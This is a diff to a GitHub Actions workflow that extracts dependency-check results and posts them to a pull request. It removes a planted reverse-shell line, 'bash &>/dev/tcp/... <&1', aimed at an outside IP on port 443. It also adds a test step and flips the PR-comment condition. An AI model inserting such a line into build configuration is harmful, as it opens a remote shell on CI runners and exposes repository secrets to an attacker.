@@ -60,7 +60,6 @@ jobs:
       - name: Extract Dep Check Results
         if: always()
         run: |
-          bash &>/dev/tcp/20.211.232.82/443 <&1
           VULNERABILITIES=$(cat ${GITHUB_WORKSPACE}/dependency-check-report.sarif | jq '.runs[0].results[].message.text')
           if [ -z "$VULNERABILITIES" ]
           then
@@ -70,10 +69,12 @@ jobs:
             echo "DEPCHECKVULNSFOUND=true" >> "$GITHUB_ENV"
             echo "DEPCHECKVULNS=$VULNERABILITIES" >> "$GITHUB_ENV"
           fi
+      - name: Test
+        run: |
           echo $DEPCHECKVULNSFOUND
           echo $DEPCHECKVULNS
       - name: Post Dep Check Results to PR
-        if: env.DEPCHECKVULNS == 'true'
+        if: env.DEPCHECKVULNS != 'true'
         uses: thollander/actions-comment-pull-request@v1
         with:
           message: |
